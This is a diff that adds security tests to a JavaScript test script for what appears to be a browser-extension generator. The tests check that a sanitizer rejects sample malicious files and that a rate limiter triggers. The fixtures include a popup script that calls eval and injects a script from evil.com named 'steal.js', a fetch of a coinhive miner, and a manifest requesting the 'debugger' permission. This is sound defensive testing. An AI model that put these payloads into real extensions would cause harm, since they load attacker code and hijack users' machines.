@@ -206,8 +206,122 @@ async function runTests() {
       throw new Error(`Logout failed: ${JSON.stringify(logoutRes.data)}`);
     }
 
+    // 12. Security Sanitization Audit (Direct Unit Test)
+    console.log(`\n[Test 12] Running code sanitization security audit...`);
+
+    // Dynamically import the sanitizer for direct testing
+    const { sanitizeGeneratedCode } = await import("./utils/sanitizeCode.js");
+
+    // 12a. Poisoned payload with eval()
+    const poisonedFiles = {
+      "manifest.json": JSON.stringify({
+        manifest_version: 3,
+        name: "Evil Extension",
+        version: "1.0.0",
+        action: { default_popup: "popup.html" },
+        permissions: ["activeTab"],
+      }, null, 2),
+      "popup.html": `<html><body><h1>Hacked</h1></body></html>`,
+      "popup.js": `const data = eval("alert('xss')"); document.write("<script src='http://evil.com/steal.js'></script>");`,
+    };
+
+    const poisonReport = sanitizeGeneratedCode(poisonedFiles);
+    if (!poisonReport.safe && poisonReport.violations.length >= 3) {
+      console.log(`✅ Poisoned payload REJECTED! ${poisonReport.violations.length} violations detected:`);
+      poisonReport.violations.forEach(v => console.log(`   ⛔ ${v}`));
+    } else {
+      throw new Error(`Security scanner should have caught eval/document.write/http violations, got: ${JSON.stringify(poisonReport)}`);
+    }
+
+    // 12b. Crypto miner domain detection
+    const minerFiles = {
+      "manifest.json": poisonedFiles["manifest.json"],
+      "popup.html": `<html><body>Loading...</body></html>`,
+      "popup.js": `fetch("https://coinhive.com/lib/coinhive.min.js").then(r => r.text());`,
+    };
+
+    const minerReport = sanitizeGeneratedCode(minerFiles);
+    if (!minerReport.safe && minerReport.violations.some(v => v.includes("Crypto Miner"))) {
+      console.log(`✅ Crypto miner domain BLOCKED!`);
+    } else {
+      throw new Error("Security scanner should have detected crypto miner domain.");
+    }
+
+    // 12c. Clean payload should pass
+    const cleanFiles = {
+      "manifest.json": JSON.stringify({
+        manifest_version: 3,
+        name: "Clean Extension",
+        version: "1.0.0",
+        action: { default_popup: "popup.html" },
+        permissions: ["activeTab", "storage"],
+      }, null, 2),
+      "popup.html": `<!DOCTYPE html><html><head><link rel="stylesheet" href="popup.css"></head><body><h1>Hello</h1><script src="popup.js"></script></body></html>`,
+      "popup.css": `body { font-family: sans-serif; padding: 10px; }`,
+      "popup.js": `document.querySelector('h1').textContent = 'Clean Extension Loaded!';`,
+    };
+
+    const cleanReport = sanitizeGeneratedCode(cleanFiles);
+    if (cleanReport.safe && cleanReport.violations.length === 0) {
+      console.log(`✅ Clean payload PASSED security audit!`);
+    } else {
+      throw new Error(`Clean payload should pass but got violations: ${cleanReport.violations.join("; ")}`);
+    }
+
+    // 12d. Blocked manifest permission check
+    const { validateExtensionOutput } = await import("./utils/validateExtensionOutput.js");
+
+    const dangerousManifest = {
+      "manifest.json": JSON.stringify({
+        manifest_version: 3,
+        name: "Spy Extension",
+        version: "1.0.0",
+        action: { default_popup: "popup.html" },
+        permissions: ["activeTab", "debugger"],
+      }, null, 2),
+      "popup.html": `<html><body>Spy</body></html>`,
+    };
+
+    try {
+      validateExtensionOutput(dangerousManifest);
+      throw new Error("Validator should have blocked 'debugger' permission.");
+    } catch (err) {
+      if (err.message.includes("blocked permission")) {
+        console.log(`✅ Dangerous manifest permission "debugger" BLOCKED!`);
+      } else {
+        throw err;
+      }
+    }
+
+    console.log(`✅ All security audit sub-tests passed!`);
+
+    // 13. Rate Limiter Verification
+    console.log(`\n[Test 13] Testing rate limiter on /api/auth/register...`);
+
+    // Register rapidly — the limit is 5 per 15min, we already used 1 at the start
+    let rateLimited = false;
+    for (let i = 0; i < 6; i++) {
+      try {
+        await axios.post(`${BASE_URL}/auth/register`, {
+          username: `ratelimit_probe_${timestamp}_${i}`,
+          password: "testpass123",
+        });
+      } catch (err) {
+        if (err.response && err.response.status === 429) {
+          rateLimited = true;
+          console.log(`✅ Rate limiter triggered on attempt ${i + 1}! (HTTP 429)`);
+          console.log(`   Retry-After: ${err.response.headers["retry-after"]}s`);
+          break;
+        }
+      }
+    }
+
+    if (!rateLimited) {
+      console.warn(`⚠️  Rate limiter did not trigger within 6 rapid requests (may need IP-based testing).`);
+    }
+
     console.log(`\n🎉 ALL TESTS PASSED SUCCESSFULLY!`);
-    console.log(`Container stack is fully operational, secure, and ready for deployment.\n`);
+    console.log(`Security audit complete. Container stack is fully operational and hardened.\n`);
   } catch (error) {
     console.error(`\n❌ TEST FAILING AT STEP:`, error.message);
     if (error.response && error.response.data) {
@@ -218,3 +332,4 @@ async function runTests() {
 }
 
 runTests();
+
